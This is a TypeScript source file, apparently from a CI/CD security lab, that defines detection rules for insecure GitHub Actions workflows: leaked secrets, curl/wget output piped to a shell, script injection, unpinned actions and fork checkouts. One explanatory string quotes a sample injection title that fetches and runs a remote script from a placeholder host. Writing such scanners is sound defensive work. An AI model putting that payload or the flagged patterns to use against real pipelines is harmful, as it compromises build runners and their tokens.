import type { Job, SecurityFinding, Step, WorkflowFile } from '@cicd-lab/shared';

export type RuleSeverity = SecurityFinding['severity'];

export interface RuleContext {
  workflow: WorkflowFile;
  rawYaml: string;
}

export interface RuleFinding extends SecurityFinding {
  /** Stable rule identifier, e.g. `interpolation-in-run`. */
  ruleId: string;
}

/**
 * A detection rule: pure function over the parsed workflow plus raw YAML.
 * `whyItMatters` is attacker-view (1–2 sentences), `fixHint` tells how to
 * fix without giving a full solution, `reference` deep-links the web guide.
 */
export interface DetectionRule {
  id: string;
  severity: RuleSeverity;
  category: string;
  summary: string;
  whyItMatters: string;
  fixHint: string;
  reference?: string;
  detect(ctx: RuleContext): RuleFinding[];
}

export function defineRule(rule: DetectionRule): DetectionRule {
  return rule;
}

interface StepSite {
  jobId: string;
  stepIndex: number;
  step: Step;
}

function eachStep(workflow: WorkflowFile): StepSite[] {
  const sites: StepSite[] = [];
  for (const [jobId, job] of Object.entries(workflow.jobs)) {
    (job.steps || []).forEach((step, stepIndex) => sites.push({ jobId, stepIndex, step }));
  }
  return sites;
}

interface EnvSite {
  scope: string;
  key: string;
  value: string;
}

function eachEnvValue(workflow: WorkflowFile): EnvSite[] {
  const sites: EnvSite[] = [];
  const collect = (scope: string, env?: Record<string, string>) => {
    for (const [key, value] of Object.entries(env || {})) {
      if (typeof value === 'string') sites.push({ scope, key, value });
    }
  };
  collect('workflow env', workflow.env);
  for (const [jobId, job] of Object.entries(workflow.jobs)) {
    collect(`job "${jobId}" env`, (job as Job).env);
    ((job as Job).steps || []).forEach((step, i) => {
      collect(`step ${i + 1} env`, step.env);
      for (const [key, value] of Object.entries(step.with || {})) {
        if (typeof value === 'string') sites.push({ scope: `step ${i + 1} with`, key, value });
      }
    });
  }
  return sites;
}

/** 1-based line number of the first occurrence of `snippet` in raw YAML. */
export function lineOf(rawYaml: string, snippet: string): number | undefined {
  if (!snippet) return undefined;
  const idx = rawYaml.indexOf(snippet);
  if (idx < 0) return undefined;
  return rawYaml.slice(0, idx).split('\n').length;
}

/** Non-empty run-script lines with their 1-based position inside the script. */
function runLines(step: Step): { text: string; offset: number }[] {
  if (!step.run) return [];
  return step.run.split('\n').map((text, offset) => ({ text, offset }));
}

function makeFinding(
  rule: DetectionRule,
  message: string,
  snippet?: string,
  ctx?: RuleContext,
): RuleFinding {
  return {
    ruleId: rule.id,
    severity: rule.severity,
    category: rule.category,
    message,
    line: ctx && snippet ? lineOf(ctx.rawYaml, snippet) : undefined,
    remediation: rule.fixHint,
  };
}

const GHA_REF = '/reference/github-actions';

const secretsEchoExpression = defineRule({
  id: 'secrets-echo-expression',
  severity: 'high',
  category: 'secrets',
  summary: 'Secret interpolated into shell output',
  whyItMatters:
    'Expressions are evaluated before the shell runs, so the secret value lands in plaintext logs readable by anyone with run access.',
  fixHint: 'Pass secrets via env: and never print them; mask values with ::add-mask::.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        // ::add-mask:: is the documented masking pattern, not a leak.
        if (/add-mask/i.test(text)) continue;
        if (/echo[^\n]*\$\{\{\s*secrets\./.test(text)) {
          out.push(
            makeFinding(
              secretsEchoExpression,
              `Secret may be echoed to logs via expression interpolation in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const envDump = defineRule({
  id: 'env-dump',
  severity: 'high',
  category: 'secrets',
  summary: 'Environment dump in run script',
  whyItMatters:
    'Dumping the environment prints every secret available to the job, including the automatic GITHUB_TOKEN.',
  fixHint: 'Inspect single variables instead of the whole environment.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/\bprintenv\b/.test(text) || /(^|[;&|\s])env(\s|$|[;&|])/.test(text)) {
          out.push(
            makeFinding(
              envDump,
              `Environment dump may expose secrets in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const AWS_KEY_RE = /AKIA[0-9A-Z]{16}/;

const awsAccessKey = defineRule({
  id: 'aws-access-key',
  severity: 'high',
  category: 'secrets',
  summary: 'Long-lived AWS key in workflow',
  whyItMatters:
    'Static access keys never expire on their own; once committed they work for anyone until manually revoked.',
  fixHint: 'Use OIDC (role-to-assume + id-token: write) instead of static keys.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    const seen = new Set<string>();
    const flag = (where: string, snippet: string) => {
      const key = `${where}:${snippet}`;
      if (seen.has(key)) return;
      seen.add(key);
      out.push(
        makeFinding(awsAccessKey, `AWS Access Key ID detected in ${where}`, snippet, {
          workflow,
          rawYaml,
        }),
      );
    };
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        const m = text.match(AWS_KEY_RE);
        if (m) flag(`step "${step.name || 'unnamed'}"`, m[0]);
      }
    }
    for (const site of eachEnvValue(workflow)) {
      const m = site.value.match(AWS_KEY_RE);
      if (m) flag(`${site.scope} ("${site.key}")`, m[0]);
    }
    return out;
  },
});

const CRED_KEY_RE =
  /([\w.-]*(password|passwd|secret|token|api[_-]?key|[_-]pass\b|[_-]pwd\b)[\w.-]*)\s*[:=]\s*["']?([^"'`\s][^"'`\n]*)/i;

const hardcodedCredential = defineRule({
  id: 'hardcoded-credential',
  severity: 'high',
  category: 'secrets',
  summary: 'Credential assigned in plaintext',
  whyItMatters:
    'Anyone with read access to the workflow — including fork contributors via logs — learns a working credential.',
  fixHint: 'Reference secrets (secrets.NAME) or a secrets manager; never assign credential values inline.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    const flag = (where: string, key: string, snippet: string, seen: Set<string>) => {
      const k = `${where}:${key}`;
      if (seen.has(k)) return;
      seen.add(k);
      out.push(
        makeFinding(hardcodedCredential, `Hardcoded credential "${key}" in ${where}`, snippet, {
          workflow,
          rawYaml,
        }),
      );
    };
    const seen = new Set<string>();
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        const m = text.match(CRED_KEY_RE);
        if (m && !m[3].includes('${{')) flag(`step "${step.name || 'unnamed'}"`, m[1], text.trim(), seen);
      }
    }
    for (const site of eachEnvValue(workflow)) {
      if (site.value.includes('${{')) continue;
      const m = `${site.key}=${site.value}`.match(CRED_KEY_RE);
      if (m && m[3].trim()) flag(`${site.scope}`, site.key, site.value, seen);
    }
    return out;
  },
});

const curlPipeShell = defineRule({
  id: 'curl-pipe-shell',
  severity: 'critical',
  category: 'supply-chain',
  summary: 'Remote script piped to shell via curl',
  whyItMatters:
    'The executed bytes are whatever the server returns at runtime — a compromised CDN or repo ships malware straight into the runner.',
  fixHint: 'Download the file, verify its checksum, then execute.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/curl.*\|\s*(ba)?sh/.test(text)) {
          out.push(
            makeFinding(
              curlPipeShell,
              `Piping curl output to shell in step "${step.name || 'unnamed'}" — supply chain attack vector`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const wgetPipeShell = defineRule({
  id: 'wget-pipe-shell',
  severity: 'critical',
  category: 'supply-chain',
  summary: 'Remote script piped to shell via wget',
  whyItMatters:
    'The executed bytes are whatever the server returns at runtime — a compromised source ships malware straight into the runner.',
  fixHint: 'Download the file, verify its checksum, then execute.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/wget.*\|\s*(ba)?sh/.test(text)) {
          out.push(
            makeFinding(
              wgetPipeShell,
              `Piping wget output to shell in step "${step.name || 'unnamed'}" — supply chain attack vector`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const errorSwallow = defineRule({
  id: 'error-swallow',
  severity: 'medium',
  category: 'reliability',
  summary: 'Build errors swallowed with || echo',
  whyItMatters:
    'Masked failures let broken or vulnerable artifacts proceed down the pipeline as if they passed.',
  fixHint: 'Let build failures propagate naturally; gate deploys on success.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/\|\|\s*echo/.test(text)) {
          out.push(
            makeFinding(
              errorSwallow,
              `Build errors silently swallowed with "|| echo" in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const INTERPOLATION_RE = /\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref(_name)?|inputs\.|needs\.|steps\.|matrix\.)/;

const interpolationInRun = defineRule({
  id: 'interpolation-in-run',
  severity: 'high',
  category: 'injection',
  summary: 'Untrusted context interpolated into run script',
  whyItMatters:
    'Expressions are substituted before the shell starts, so attacker-controlled values (PR titles, issue bodies, workflow inputs) become live shell code. A crafted title like `"; curl evil.sh | sh; echo "` executes with the job token.',
  fixHint:
    'Pass the value through an intermediate env: variable and quote it ("$VAR") instead of interpolating ${{ }} inside run:.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        const m = text.match(INTERPOLATION_RE);
        if (m) {
          out.push(
            makeFinding(
              interpolationInRun,
              `Direct interpolation of "${m[0]}" in step "${step.name || 'unnamed'}" enables script injection`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const USES_RE = /^([^@\s]+)@(\S+)\s*$/;
const SHA_RE = /^[0-9a-f]{40}$/;

const unpinnedUses = defineRule({
  id: 'unpinned-uses',
  severity: 'medium',
  category: 'supply-chain',
  summary: 'Action not pinned to full commit SHA',
  whyItMatters:
    'Mutable tags and branches can be moved by the action owner — or an attacker who compromises it — so the next run executes different code. SHAs can even be spoofed across forks (impostor commits), so the SHA must belong to the trusted repo.',
  fixHint:
    'Pin every third-party action to its full 40-character commit SHA with the version in a trailing comment, and let Dependabot propose updates.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (!step.uses || step.uses.startsWith('./')) continue;
      const m = step.uses.match(USES_RE);
      if (m && !SHA_RE.test(m[2])) {
        out.push(
          makeFinding(
            unpinnedUses,
            `Action "${m[1]}" pinned to mutable ref "@${m[2]}" instead of a full commit SHA`,
            step.uses,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

function triggerNames(workflow: WorkflowFile): string[] {
  const on = workflow.on;
  if (typeof on === 'string') return [on];
  if (Array.isArray(on)) return on.filter((t): t is string => typeof t === 'string');
  if (typeof on === 'object' && on !== null) return Object.keys(on);
  return [];
}

const prTargetCheckout = defineRule({
  id: 'pr-target-untrusted-checkout',
  severity: 'high',
  category: 'flow-control',
  summary: 'Fork code checked out under pull_request_target',
  whyItMatters:
    'pull_request_target runs with base-repo secrets and a write token. Checking out the fork head (ref: pull/…/merge, head.sha, or repository: head.repo) and executing it is a pwn request — the classic fork-PR RCE. actions/checkout v7+ refuses these patterns by default.',
  fixHint:
    'Do not check out fork code in pull_request_target; use the pull_request event or a maintainer-approved trusted SHA instead.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    if (!triggerNames(workflow).includes('pull_request_target')) return [];
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (!step.uses || !/checkout@/i.test(step.uses)) continue;
      const withBlock = step.with || {};
      const ref = String(withBlock.ref || '');
      const repo = String(withBlock.repository || '');
      const dangerous =
        /pull\/\d+\/(head|merge)/.test(ref) ||
        /head\.sha/.test(ref) ||
        /head\.repo/.test(repo);
      if (dangerous) {
        out.push(
          makeFinding(
            prTargetCheckout,
            `Untrusted fork checkout ("${ref || repo}") under pull_request_target in step "${step.name || 'unnamed'}"`,
            step.uses,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

const missingPermissions = defineRule({
  id: 'missing-explicit-permissions',
  severity: 'medium',
  category: 'permissions',
  summary: 'No explicit token permissions',
  whyItMatters:
    'Without an explicit block the job inherits broad repository defaults, so any compromised step can use the token far beyond the job needs.',
  fixHint:
    'Set top-level `permissions: {}` and grant each job only the scopes it needs (least privilege).',
  reference: GHA_REF,
  detect: ({ workflow }) => {
    // Any declared block counts as explicit — including top-level `{}` (deny by default).
    const topLevel = workflow.permissions !== undefined;
    const anyJob = Object.values(workflow.jobs).some(
      (job) => (job as Job).permissions !== undefined,
    );
    if (!topLevel && !anyJob) {
      return [
        {
          ruleId: missingPermissions.id,
          severity: missingPermissions.severity,
          category: missingPermissions.category,
          message: 'Workflow relies on default token permissions — declare explicit permissions',
          remediation: missingPermissions.fixHint,
        },
      ];
    }
    return [];
  },
});

/** Registry in stable evaluation order. */
export const RULES: DetectionRule[] = [
  secretsEchoExpression,
  envDump,
  awsAccessKey,
  hardcodedCredential,
  curlPipeShell,
  wgetPipeShell,
  errorSwallow,
  interpolationInRun,
  unpinnedUses,
  prTargetCheckout,
  missingPermissions,
];

export function runRules(ctx: RuleContext): RuleFinding[] {
  return RULES.flatMap((rule) => {
    try {
      return rule.detect(ctx);
    } catch {
      return [];
    }
  });
}
